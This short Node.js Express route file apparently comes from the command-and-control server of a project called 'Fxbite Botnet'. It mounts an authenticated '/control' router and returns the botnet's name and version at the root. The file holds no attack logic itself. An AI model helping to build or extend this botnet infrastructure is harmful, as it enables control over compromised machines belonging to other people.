const controlRouter = require('./control')
const {authCommander} = require('../middleware/auth')

const route = (app) => {

    app.use('/control', authCommander, controlRouter)

    app.use('/', (req, res, next) => {
        res.status(200).json({
            info: 'Fxbite Botnet',
            version: '^1.0.0'
        })
    })

    app.use('*', (req, res, next) => {
        res.status(400).json({
            message: 'Nothing here dude!'
        })
    })
}

module.exports = route